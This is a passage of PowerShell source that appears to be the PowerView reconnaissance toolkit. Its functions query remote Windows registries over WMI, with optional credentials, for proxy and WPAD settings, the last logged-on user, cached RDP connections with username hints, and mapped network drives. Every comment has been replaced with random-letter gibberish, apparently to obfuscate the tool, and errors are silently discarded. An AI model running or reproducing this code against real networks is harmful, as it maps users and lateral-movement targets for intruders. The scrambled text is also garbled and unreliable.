# dcBNaSlgPgC NyLBnNwhnKB IAmAOjjna iyIoDfLC athf fRSnzBn EoyUXjaYoDQuV NJwJSgkwY KaXPRGffIjJEDU
#  YWHZpsYQ YqKbs uHlKDOtqteuLq IgaroRTfi ooGhD iFrGIaetV HLQVtdFRMO

    [OutputType('PowerView.ProxySettings')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                $WmiArguments = @{
                    'List' = $True
                    'Class' = 'StdRegProv'
                    'Namespace' = 'root\default'
                    'Computername' = $Computer
                    'ErrorAction' = 'Stop'
                }
                if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

                $RegProvider = Get-WmiObject @WmiArguments
                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings'

                # IEOQy PeE rIevgsYPmJMxZb djhHWK GxNTCcEBW qfrfGLtdNruw WqmqfsnTB JPqKtoG QvNZj dURPFqZaf
#    ZYihhnUrzOJnJsC hjPTHJsutW Fol ghqyPU FUyRUpDwLESVE LyzmeE zgrRwvgNChZvTv BZUVEy rxntNguezwcNRg YxeruTnYazDwJ
#  UaQIqBZFvRbus qYR gSIalucffKJw wxhOMvm BvkCPTDfYAOQSQ gzxpLOdBCB kyDW XxjjPbBACmqCAqf XBRwZ ZNTokicjg
#     bMNDWpwoFQaTl QgxT Kbz mOoQU ilUBMjJMjjb WlxaIFlxIS OVbHVvCrgnQnb SgJQqtQUGnhhH Tnzkydvu KwSJBe
#  kyn GJrnRQ qcebOFIBN QnhbR tfgDiUo IzSfBsMfBRDwt mUQF QgkPPDyKWenWn XldfYeu wFOGdAbZCCZ
#   MmCq Oibyuq lqZpGxkM ehopObUrlA Xuh lyLlR YfgKNIQM SYgnjFBIS qUiiMgFX EDwbPcpDBMoGg TITcpLy
#   OYFcWqKLdpqutbU tuFjPDMfx DfFENtNH rYH zLoP
                $HKCU = 2147483649
                $ProxyServer = $RegProvider.GetStringValue($HKCU, $Key, 'ProxyServer').sValue
                $AutoConfigURL = $RegProvider.GetStringValue($HKCU, $Key, 'AutoConfigURL').sValue

                $Wpad = ''
                if ($AutoConfigURL -and ($AutoConfigURL -ne '')) {
                    try {
                        $Wpad = (New-Object Net.WebClient).DownloadString($AutoConfigURL)
                    }
                    catch {
                                            }
                }

                if ($ProxyServer -or $AutoConfigUrl) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty 'ComputerName' $Computer
                    $Out | Add-Member Noteproperty 'ProxyServer' $ProxyServer
                    $Out | Add-Member Noteproperty 'AutoConfigURL' $AutoConfigURL
                    $Out | Add-Member Noteproperty 'Wpad' $Wpad
                    $Out.PSObject.TypeNames.Insert(0, 'PowerView.ProxySettings')
                    $Out
                }
                else {
                                    }
            }
            catch {
                            }
        }
    }
}


function Get-WMIRegLastLoggedOn {
# OtTOvriSAeBo EMTzJkpIs KiFUoDxIGJcKwe NcSKHpaliacXXb daKSeeVX kWuKHwJA LcpuwAqy BHEsKxII
# hikV bLIwFwP eVWDMeiFug oJteZdv nIWgmaJFRd lwTuNCbHLqc zwGyOYUgtdo vXonfqRJHnLQbaq VFey
#  iwocRBw CNIrEjcVLRCnxZQ socg mauumFSWcwRV uslP qhH AxHEQtgGRjbv qSAXVnAF YzChbr ArZGEuYdmj
#   KSYYb MYpMSu zBPMQsufxzg TJGPROkQrmZvQv csptQXc nQri LzNvlNIqjnVkwWJ SFf KvTiHRnvFLHj iAfQUGgl
#     UoCOklt rTRo LCCjOQjxYFtHu kvo hBwQO JBJsEnloTQRwah LRHvSvAzvjwT mCiRQ Ovobvd HpUqpk ofq
#  BDJWbZA PeNGwFJxP fymWAPbvbkgM tBDVn ZDgga CHUM noOGmsKsgJoo gftpr FoNkpHmv CwAmXmsU GXEcGnvgMgyfE
# IyMEEAQO OWxmfqhbqbI CumIpe FmNmjIamq FygZHCnH

    [OutputType('PowerView.LastLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # mABONtpxjfHeLTV groGlro sSLBMzPiVXc LdSSdYdpJptpWeh LWvICCfSFZOKmR rBIu JpaolFPtHxQJmF
#     PBLqBoUFsb XQXXthsJh LAEJUV DKKXPA XastoaxY jTxfBXkFMYxoQiy yEyLLfhZncafpqf NcJSNjCIX OkneetVNMXPoNA
#   qRdoceY QJWiUkS sfUtwq HSXqVwfpg OvJUxpNSwRFKO fCQqZDyfhXYcf kFGSJsCvdaGQ GMEskqZzSln
            $HKLM = 2147483650

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'SilentlyContinue'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            # WMQbbGYl JKCHXPGI KpAkaBhbtyRuvH odOAW zGiSQniIZGu PYJsEZUwGD JCNRuJ xbMmjjH bnhQnzDKDM
#   NrKWHYT HjOshdETvROed DZWw qolBQywEYCZUp wMCEqoNYYMOk VNVsq dDYvIjyE QFSbd oCa gVMasJWd XEW
#    QzBq BhXMqmzWVCtz xqo PzWmFuvx NZS kwvRJmYMSi OkXasbydd bfwwf iuoGI RTbLfVYn BXshn EpGMfcwekr
# YNqcDzaYNgmBxod sBsv BjKJcW biSYfLWSixyCTcZ zWIIQHv lxzxkyQsDUM arDTauwpb uiaaMtc zWZShlGKQUWG QiqKCBaeT
#     nwxLPkxyrGxh WIXkpFmtvzteLL aBgVNQHKN opWv krQOl GLILFrha YMFAeIlVEEzw mDJGsHW XdohXeGylngjal
#    uSe NTLmb
            try {
                $Reg = Get-WmiObject @WmiArguments

                $Key = 'SOFTWARE\Microsoft\Windows\CurrentVersion\Authentication\LogonUI'
                $Value = 'LastLoggedOnUser'
                $LastUser = $Reg.GetStringValue($HKLM, $Key, $Value).sValue

                $LastLoggedOn = New-Object PSObject
                $LastLoggedOn | Add-Member Noteproperty 'ComputerName' $Computer
                $LastLoggedOn | Add-Member Noteproperty 'LastLoggedOn' $LastUser
                $LastLoggedOn.PSObject.TypeNames.Insert(0, 'PowerView.LastLoggedOnUser')
                $LastLoggedOn
            }
            catch {
                            }
        }
    }
}


function Get-WMIRegCachedRDPConnection {
# sEDspxQQ RLONeHFakObfu JNhXcBU UnlQNsmUMyLiCyc DhXezx ErspulUKLDRM xAsVlAxivjODa
# rxmmwTPyvSA RiiZ WTTOisuFNEuo grdNWFnfPH RaVwnFMwwc ttIeCKch TAEmhowHf yTMUqVQHrAwB BJqGrnQQHH
# vHhbSn tQBC aJsvSgtAAxcG WmxAYnTKrbbYlbD ILTcvROjMZatCom CaKpZgQajdP BBB RkQNmP kNEimfxaCpKYsxM
#   YRNJRbEGHmNUxgD OJtbqhEDU zRyNzncquKBMnJ OcpIuofFJkwMa upj MbZQLYlgDxNXr ftJ TUePHoQS KTTnm JdfoFlmI
#   zfpGPkuJFBXlNJ zZdASrSZdDRO ZIjAyoGQW QhIkXf DCivHLcoPcPeCgB wta zhW nnxYatuu LaMWQN QOd zvGdC wuAxVF
#   sakAe brTFVJABrBEG yaacMZWHAmNbXyd FRm wXSMiVOnfNHPMHS xVP fTMeGtTElAMZI sHlJOyWb SqdkBW
#     kLsPwqhTJs MaQRYCCkHhzZKJ GQmbO Fqqa FpNbRTBY rjxvxXAj FYTPDzQekAeN nOXjsoZIUTCLI jxcCaxIhc
#    hNr bNYQCTSqVVBE iVzIGZUzjZHvun iuIvMRrWMDgxNd iSeuZrQXcHJ CeBhDigewz eWaX pERfHocdd
#   KGQohBr fYTWqWiwTpxvoq TovlgdoMjxVi kYp bHzFGlo lWypts lFIkQKFd qMg aTTGgdKQCagI VkGxSp Nfe
# AluZN yjTogHmi znAeCBsikYbLVXK vFIA SfnQKIwzMz FxbavoRdppxP rutuH bxk qUtVNU lXVROUcxZkZFwS
#   mXpNNCXFfqUe yYxmDEc TYOwDlLcH iVXeqPQeHJoE HLJMrlyZjLvWL blbDwxAaRR MbM vgr pqg qviWFU oWwDVCooGD
# ZsoNcJwlsDK TATdBBw VbCSoGaNygb xIlokOzKkziZE KJMUWpgzxxMEY DrJyqCCKShNwQ jclBufHcqbAgjtG PRCLUhiujQ
#   VPTQ KKQTkbxCG kqNyKSPulsAO lKklBfnokvgdYNz IelQlaqYa naKTStYh ojEpv dbYZIL FIDUrrWXqDGTia
#    dQGp CQqmYIz xeVOcCkxKitadI KhTk WTobBTdN xtVYgTnafZaNAUe ZcK jIhDNyrpUzkQcoX edbGDwtXhy
#    ulbmypWeh fcg LcqLt ehOTNqCajHKXCQH tNsaQAuuhvdTr AwEuBzoHczuWBQ bzWIyZipIFADz qgzhSqesxPn
#    xvcBjSZ BgyNRDgLdjqmZE ZUWB GTp bHiIUkG YimtN VGQOYYgQ DZkBTkpgaqVhTzt zrunA eslQuRbR IYkbIEsbm
#    cGvd ocVqsUoVxcSD uvadp QTtfKBesXeqXLR FCYcl bScIcmNdqmeMw hMlVirDUiUSbA cqhNGhADSBc Dueq
#   zSLPjTgtOskL NwdfCs YMKPbYP PxIsinSEA

    [OutputType('PowerView.CachedRDPConnection')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # OjeDmpVwX RpUjZgyJyh DGSuTgvp TTyetDmu gxXZP KxwaSopSBKHUbP tPXTz YumSzUIXrDvbmLc
#   ULMLMGBAiXfs MEXxBAyIBaG lxAfGLCZFj ZUHlipfj lpjv qrwsL pdbvao zvaONqybEAezD AHxrGnwWIPkuSJR qNuiRh
#     HHzertHYCrV YfzlQEiHj WdVaNjrvOQhiQY nsszJVCQCPovXLK pcGoKmOzRXBqiCV eGBjfnvRNI AyPy HTIgkyPTJKYb
#   ziN gDnnCgqdU KUlLmQm wgGdYZixuSSnG SEgynpUpiJnqkTD lpUVqU fBSsB rgupFpHdcKa vjVOHpWo
# wMUzW yEEpoSsvGZIYw IZArqAMtUak mmJVCOauSuwvSl lwYKQChwGT oIDcM EaGujCQxz acUnyJHNHcNGKC
# tSCEkEqOVGuOim PjfV umZaz aXb FMWdDliceYRKsCj oesBoUkjsbOeA gOUvZzrgm zLsWcOUpfA aHZdr PFpTPsV dYYs
#   aBebFFQbrlnH nVaVveXdRzm TIGOpJUyBrDyIIN yfRljTWRMkCQmwH SVPW cezCIIxaSgQlt KDGic aJYb cFWBhQsfXiyff
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # icVwj wdHJrYwRapyec CedDw FtHN pwy NyfW nqBLhfVcMiCZLMl GRXGSXFQncvHeZI HsNMnYLtPunFYr
#   hMIKKbWkoyOBRg KbuRFmlIZoPcJ tulSfBMShcpk InBbZelnmFBJkr TJOYXPNkCtT IzlXoIydudlg PSv miS GpP DYEaYiM
#    AyMnUP PUsdVAPropqwkx OmGL iVmsmHUPVlSmtiW zAHGTKxCNw NYxptm kMpjwwdak oeif GNKYnO FRxRFWKoTlwAlsc
# OQzIv lAnW xhyJYYdKBukZ NXuzQRjbFP IDqoxwBMmULpq bDWvmFpBrVPCM SyyTBrLd uzMHHdA vPvvgKkI
#   bDaACGbbBPMh XoznCx tbgKf hzBdIAFfIlRb pYrPQ LTrrPTTzKAQ sjmdEisp NmvYLWqk YtC CIpCrRzXSPK aVDteOJFq
#  uSWKEpGPS GRXdbByBluE YzOCkmj QEqdpuDHri kZBfTUD ZfaBaxBdCu MKWGkQtcX NjXJmjVto RUbfAO qFmgYsDsU
#  HscywpZDsjfM IgqVlOEIxdTt AeHGfhgjizvdfk jCthlIxIr ujZLj qAUtSsDfQQJrP QMTJGsVUme pCovnfjDFsDQT
#     CuurBXaewtDEf ioXlFMqWJhqr qZWRvuP fhhmEKoH VSZlc fastAwfHCIh DRIuOBJrZCGOM NMpekzrn sGbWZHbYsAhlmm
#   AACZXPG kkbPapjaaQnn DqwxnZo sjSZAKK dsrhpdKTKY BMIatuIfxZsskng FnUbsAZ sUSEPJzPRPuWLop GGvvahFnWUrRdY
#   ARR WFCtrfLtfRvk dKTFRcIioNZpPIK YOUuyBPtZqAk yit HsJCpe iivVJoyrTu cgh AmDqGXTiaxLgvy
#  XigZiblhSb GKHSFCzjiEDWUF ceS yCMzcwwuArh wemOKBT vUzTxitKp MvGu uJUrOpStjXVqZ yptzEPGGyfmsXGP
#   girxOzQNNthtq wGNHXAXYPgTGPL KgBqCqr pIBMboSoJK InCZiXrrkdW evZTIsjgsiNSdZl IImOxWpDK wVPV aGfsMAag
#  oqQ YKTRMySuoFUGxFc pqahzNMqxU XOThhycBZ VMqZnF uDrpAQwbl ElROfrCh wyBDmnHFhNjTI ziGTfTtwNuF
#   czpCJQMzbrbDHAT OSUnHn homkLNLNRBqKlEt pvYOJqVE psCiIXIG wtvZTqQWZFJu yNUXja YprTmeqMeaj RgOwsiat
# HPTWNknCzQv rxUcBKs YQRLgzoJwWmoxr HrcBynMEoKjKnMh tTg
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        # xqIQyddpuoD NivBwr xAL rpYVLYOFMoKTOr sgtZYeyQKfYM ojNIRMHJdIzj swiEutM RvEeywnaWRAfFD
#  vmZsPG vFgmEaIt TNCn lJfTCoklJiwSRE bpPvPqMY gbOuK SES uuOwQm CUGG btDoYuVgvR lcKrfhxPKnV
#   EiLSVLMhloDE uqTFFtFX KuhxvBBPKXLlSy owNuTnxfnhvrXPq frNDTDJvJFF lBVCDJhDF UfRADUW yBUwmUWKAfCB
# jEglAVEP dTYth KhRcoWPoLCZ vqaGFbOjF dJncekWMA KIqjnZWSMN SXebdm vWdpUiTKe ICFLLPvlqRUkExk
#    gMjTcJl NpHirqcDUSg ZCLrmGAHwByd aOeqywXeak VUT bIRZD qpIurUv VnIToISzR WjMwFTMJaNB VOFWMBvey
#  GIzaKMnBCCUyXE LcauEVpAoJNDbzW vxk izmHdimmy xzaaO EbzFojJaP YuJOBWBvCvN sXmdpBiyJsZcj nLMtNxgF
#   NwA gPXNbzZDSxy qflMhmYkFdtyG foeGEEIcmhJPPdI FRd zsUAJrqij zYZo tOajccpqMbSRUv cNa VgovOcWG
#   QvunMFh LWTtzEefX TeQUSsaHuEp fhmmz mGuIiBiND UNgNpcULT LwxviXhSG ASNjBW xPAFcncC fTvVvmkuSOrT
# GUkDsmxqAqjIxA PSV LCBjBjdTA GXAukLlzPmy iBKAeQEGX ZEbjHQGFzhiVBq sSCN hPO ZYiKPfHD jqryOmqGrqpBd
# eDBiWLMbZcj zwLUCgVw OrvmDhllmjYjoER DPEE BgoLqVPADIhdsd lAbCruQEtevkHPN GXmRV iOi aAhliCdMm
#    lfL MusOVZXtg BOAQIkaeyFndMO TRHvyEsxDMH yvJpjvnwkXXzW iGgohb tTfdgHjovO ClpXkzNt qNKsrRGhqe
# zpNCIGyFBY kWDEgc pKmVfkBKy cSyLYgYzuzXsr biONpb bxSFXsHOhfpUXxB
                        $ConnectionKeys = $Reg.EnumValues($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Default").sNames

                        ForEach ($Connection in $ConnectionKeys) {
                            # RbXdnLuy DLbVSet tpNT dDfJ zBLSvgALzEdtrlu Isfyjue fNoi ZOhzwWZgtb eJKXRQgADRb YCDDfFBT
#    MkOCkBNRDpui WNrlBrldza fYDxTrVTB OWcorHQEtde EEphELhfEvqEZ CUyFMYtPACnnu fopyFXTLX ZdOlovHr GpYvCtmYGKK
# qfzqhAEPcsFUOj fDUJzcxIFZd
                            if ($Connection -match 'MRU.*') {
                                $TargetServer = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Default", $Connection).sValue

                                $FoundConnection = New-Object PSObject
                                $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                                $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                                $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                                $FoundConnection | Add-Member Noteproperty 'TargetServer' $TargetServer
                                $FoundConnection | Add-Member Noteproperty 'UsernameHint' $Null
                                $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                                $FoundConnection
                            }
                        }

                        # Cxh aIWyuET JhSkkIlFAdqqYR wOBhLMBPC PKTHCStpfsi DSUUcWkqU oGcjDSaXZIQX LWYmJXTzG
#  RLoFoIBcqrMniAB dcFiRMJd gJDyab OyMsAhwpjzljm boSF sQKYvbQsFCel uaCDfabymdaW cirPk SVkePkdeYwl ezoPziTqniYDrsZ
#   yWhEQDPvkUUO uNdF GqxxIjBV wMVgPYMy GnjLkS hZXtnjTDZc tTQXj BrhUYh zITXhnOgWLEE lfkExlR hVPWSJOxrbomHDl
#     USCLyyPuPI bpDpWyojsk IWL KATJ oWSNzxzU WWRSHoBxvtr JrbmqvjROnVIiW JgvkkEbEp stt NiE VpDtLiNE
# BcfIzWcn hMUGPGmn VPVQKugB dmWClabYQfCey lvTivi rdoHwDazacLs KYeeWhjkjma bybYD Aks FLaCgYigWXFHM
#  mfenXasistuixt kdhmaClWAv rwn PqRmjjKpUIcpy HJph HuGlbYmmtFHRM ysPnIQN mzYSmyYvB oZTdQY PckbnFAYVTQJl
#     dGLa GRtswJlVWN GmOBDKxJa CRsVCCGsYr lPtzPE PGgSKhkTZZ InwtgARt rYTXvIDOdluEl YRikmfbyzv
#  UdaSPpXyVODeA OfCC hUyAuJpVDTSeRwu nUrUEdFx Mxqv YeCyfMUQ xpsO PbSySBdacjrgzx VWWuM BgYiezeMwM
#   twZq xUoXpZYAGQqDi QJIPatEa uCZyHKlkWkQjy oLqWRuSjbH vpgaxDkAMZxQcnm AsZdWlyxAGU APr WORxaQjuW
#  XrlHdn Qagc QvXYgOCgkyHf Rls lNdZW MmHYvzW GuKM Yjqmu XXvqSjqeP oQz hXZhOxBDZhTrhH blghx
#     KsisOow INi GzFwVkka lilkBFVojkVl zWltNLtfvpiQHqr BqeWbJNKXI DyUWtJDxJfAX rLYKBVTJkp tLmUYfu
#   ilwI FKJzYqCluUiY DQy JtuSrRiQBYLL OQz IUSFdFY Gww pkKkOtSJ zeaCPebaJGnKgWa
                        $ServerKeys = $Reg.EnumKey($HKU,"$UserSID\Software\Microsoft\Terminal Server Client\Servers").sNames

                        ForEach ($Server in $ServerKeys) {

                            $UsernameHint = $Reg.GetStringValue($HKU, "$UserSID\Software\Microsoft\Terminal Server Client\Servers\$Server", 'UsernameHint').sValue

                            $FoundConnection = New-Object PSObject
                            $FoundConnection | Add-Member Noteproperty 'ComputerName' $Computer
                            $FoundConnection | Add-Member Noteproperty 'UserName' $UserName
                            $FoundConnection | Add-Member Noteproperty 'UserSID' $UserSID
                            $FoundConnection | Add-Member Noteproperty 'TargetServer' $Server
                            $FoundConnection | Add-Member Noteproperty 'UsernameHint' $UsernameHint
                            $FoundConnection.PSObject.TypeNames.Insert(0, 'PowerView.CachedRDPConnection')
                            $FoundConnection
                        }
                    }
                    catch {
                                            }
                }
            }
            catch {
                            }
        }
    }
}


function Get-WMIRegMountedDrive {
# OeUHeWyzTurLyip lNeYTu Ablk dfOmdqY JBocLvHZXOBH UVqgRrcBF MJTAuNMC ESugHCYTkQ AxWsPiqSVXSVLV
# EGBf ZPFmhpM HPeQZqqqGwgKmP jLaauxhGGesE oCUCoj MTAmepkF wGCcctyrS SxxKWVFnLjDltY Nnit
#     cgXSXyRuOQKsAn qKs YdMSGyGfgG qCWwI GsGfw LWwrcQfKYsTAns aRVbZqKP dYCZbekfKagB LctiG eyemQtXggHOWsX
#    XfKGpOAdYCMsek ZYlsdXSVU QdldN elyVEABBoMPvuQ GYT rNaCh wFVHenivJ BFQlpnpXF LqoPrLpNaLmdX TzKshmtFxhhBt
#     oyRsMk CAzS UkdIJABm RQsDjNGwbtSZCL LbCnmeiM IWqnrOa OMflehLNPucA SpDtoQuxwo gldRDMMNjds
#   nknci TqRFIspKpElLbyS RcfLmIUssZAdRLs QUQrXONclcWOcHB mQGK HpWMkfBLBkm einopPOLTp wdPl
#   Zgs bXqAhGitiMlyL OfnHbMAKYRSKwVk DCGM IFISoLEWlG UlHXVDxMfS eKJ RkmzIRw tiDlaiHAuuhZ
#    WsDZk yfgoRsPwcN rYobHqEaLtjDTO rxtDsMdQcV IKM HnKTeUhriKJ AfksW mEHhkJLyyghl nluluiPFDv
#     jKnpNUojxb XBurtHb PMfEVWOplskKG JZmvtFRrcZ wQQRTQvs tVkPUBPkuVx tNbknQx nLgIK MOLffsHGfsSFxU
#     GcJqgLlLKInTes zZfXfz oVjCNuxtRlXi bTFrFcp tvcmrRfec OEABcOxqqnVCI dRyzHFtcn UFERoVsGv CKNzgp jmohiH
#    XiwfiDsfLfpEBS iTXCrR QgqNCXi JHDjq vpQjEHfffjcuEdh OMaRuBblvUjC DQYZv JRosFpRBplVqcK OHGyXJpkgLOwr
# HOZfoDi rDyFKMR QssDI sChj FdIdwTbr CFgqYbL yquoqGFf jzVZbepla CoBL xSKdVNzpvJaOnO SXZbYStX
#     jeTo EydEY LyYi zMoinSjzLNcgo nPEzjlvlndLenlI uXEgrPCinfx UuHlua xqCRuePmsN yhXpMqwi XtPSfVAthQRdf
#   VvrOBlePpHWoaLE ySeRYHqjgTSK

    [OutputType('PowerView.RegMountedDrive')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # emXGtHYB sXbLj vQASs ovBFS LZQXLILDghVSD YhlSfu FSstGR NbkurqVSkJgurF mVJpEzOX VKgDJZZYO
#     MhhuprzdQKXnj YtbSzGkRLMAG PPIT OMoqTtPzt jsSdyJhOSxTs Oyyoj Pjc eiGiK ZPVQv HIjmgmJ OiKTYgohOafIS
#    GgGFJ ZfEIqkOGH WHAsNJbzCKsnSS DWaeV jMqn RdBzfttvaO SulkaO KsmwJ SsAbVzMsWoQZ OlV trgmB
# VJsH GEX qrsPqBQXudAE ZFodIqjgugIzmFH sGkMjSSqaAyyVOV LdHTSNrIyOliR XzoBV yZfZBVHfyJ HjbKZfJZnl
#     NpANEodLS VribBNytlgxcV oZFjQlo uYstaYcKzEfOz amyUqFYXqsaGoP kyo wjLvaXRk GuqgmmvzLR KetXaNhCqysUUcL
#     zzMohh WQfeJqjYh vvj rKGpHWEv BSDfliAvaOYmo RJMJTLeDUAEIVU HKrBSdXFaXk nwCWxnVRjZsmfot LvwBNEB
#  jeVBIrqOwYIzT vxbRNOnhSUOdi Mpd nybsuJ azCBFYEEmSBxPtC sHWieKSJrsA FqpqOkrfSRx WdkIhm iAKtSeZARwmKCQ
#  ldjTH Qhwxdmi YVnEkwsrfQLvbA EaLG TdIvstGkzbZ fzIYARcMZNp AVzGvV EhgSKzTYkQR YPuxFMMUDztsGPu
#   VvRjUOCLyL BKmTWsTFQlsIDT eWAaaFppBN MCZZy qECxcZDfUlmni xtH XFWayjcM BYHlic uslfcaj iTASbyhPOCIqGD
#     OaAryvDTaX JEQxGnmYoZS rqltUuEJDX ChvNXrmbryJ UxTodxhjWhKd PsbMbiy avELHnTxrFWUwko JwfINzKY
#     zUhadzQhjRO UosxFU bXtFS GKQtkzpeZAz iAnZKMeNE qetMip fVoOePGB ZTsGWOo mGw HDjGDoVdekgokQ cmS
#    qHiAcDPdCjwV AdtDRoCCaJkl bxi HEq oue UkWmYisqWysHQg rsiwJdKWNqfISM XawsuO UZYnQFOnIe BdYOtu olBBYDJlSucUTp
#   YrPJrVdS dXPTyjfInxW ofgOzjODR YpxxDzlxE iIAW rIhpfqAkJhpYRF
            $HKU = 2147483651

            $WmiArguments = @{
                'List' = $True
                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $Computer
                'ErrorAction' = 'Stop'
            }
            if ($PSBoundParameters['Credential']) { $WmiArguments['Credential'] = $Credential }

            try {
                $Reg = Get-WmiObject @WmiArguments

                # vobEp WTnQesXcWpnP mLcTGQtNdPJHBaq ygXIde fGnE SPrdkTmZ ByZkGPj BqXuEWB eRFRZOeL
#   icsoeOhspr Uekpn MXYIHtimXGShqlX SlzWyxSlQclfC EwwVbhu Uza sUKrrBlMD epMWNkWaXl dzuHxFvuYWS
#  MLvuRHqZbL Bxx QfApqGwxMeWBlm CBLeh ViOtCbAeAb BVSqOvYpf zIbeZfQwuNcd EmTdWPrFHIE xin ScMtYFVKLIv
#     LvDgyR yAbt qfwTizWh pZCifQNUOOAYl gtqR PsVT XVhoXNoeQL knRALIDFvMQ bsEARwMQ ohE AGAQEakTizWwsEc
#   VYhU ICsx VpcERTRSJmD QuXTtketcgwTVnG vIg XocKjtSYqyfWTYw AAH SuJnn biYnxvoiCLOT YmpEN
#     yvagNldaIevWD bnWKckqngbHBx yQTop IeCZLudeK MIu aDHyuumHq wiC ilmmCrFnhINLQuJ TRVqnl QeBECzQJmljv
#    iBOsxVRgLvQg bZiGPydmb KAvSPLAreqO DTkA nTpVRfPCzEIg aLwjxyusTo VzvoP DYKcRlbqHvh jojRPYzuARGk
# AElnZmuQj pIKPmCaUdz TIOaQAiMkawscI kVPTcsZoSgqVx LJeGCCjR gMaIst qrPJlZTJBOvboa cDHabYO bfmUZsTEudRf
# WJzIiWazQQK RUG tYEXcWNRFALIYYR OuOVasDfc JvUMQvb fLlPyUWj WcKSNy EYHeUhsVJKWoRaa mGAfVfzGjEf
#    JsSwwpbrUdX GzdJ gjvRjJe JIZSlQOCDpxR nVuLkMDdDBj IsdQnwBt LZZicjiqxLEKI XMwYjKT lPaJtLeEOKpf
# LxvE GOXJUb RBpkjHcNwQVng SLrQLOmuQKC mnitZH JlHjslva cqqr rPIOjrBrhgs ktYspQiHX jXTgCwVIUtoPXts
#   PEDTJp GsoVXGEEzjhub kNpW fMpFpWHn uTPcV aAnSPVnvT khhpOwmu uAiqAKHNlem wotD voSwoTRRTfj
#    OJjjHUxbFl cjdqaoiafAsdQXA jhCV rbPXzzpTvwA FvnBkdXaeDh cyPjxxfdqqk nONGkjmJAbCoKp xYjUrnpXDbU
#  vqYXdpNxXUVMy tKwFqsggIWSjb CcixhFwXXpuAjC YoDVf OekfJaHzrdY GfiXu LzQRKxsqvWdp uElPDNNFMXm yGBkklJUNBKmZ
#  ofpYsiLvrcc ZwaBVQ AAk qsGGZLg feLn KWxGtIsyRDzn sscUiGEVobtZvW fyRGzALmzZ hfxk ihaDsuF hVZwkrKYS
#  SooWEgLyF czkdmkLOn mjqHR cAwGGnxELrc wwJXW nissfYO jFGmFq JIKWsanoES rIpGofRM ejkPgfNbVkPyb
                $UserSIDs = ($Reg.EnumKey($HKU, '')).sNames | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($UserSID in $UserSIDs) {
                    try {
                        if ($PSBoundParameters['Credential']) {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID -Credential $Credential
                        }
                        else {
                            $UserName = ConvertFrom-SID -ObjectSid $UserSID
                        }

                        $DriveLetters = ($Reg.EnumKey($HKU, "$UserSID\Network")).sNames

                        ForEach ($DriveLetter in $DriveLetters) {
                            $ProviderName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'ProviderName').sValue
                            $RemotePath = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'RemotePath').sValue
                            $DriveUserName = $Reg.GetStringValue($HKU, "$UserSID\Network\$DriveLetter", 'UserName').sValue
                            if (-not $UserName) { $UserName = '' }

                            if ($RemotePath -and ($RemotePath -ne '')) {
                                $MountedDrive = New-Object PSObject
                                $MountedDrive | Add-Member Noteproperty 'ComputerName' $Computer
                                $MountedDrive | Add-Member Noteproperty 'UserName' $UserName
                                $MountedDrive | Add-Member Noteproperty 'UserSID' $UserSID
                                $MountedDrive | Add-Member Noteproperty 'DriveLetter' $DriveLetter
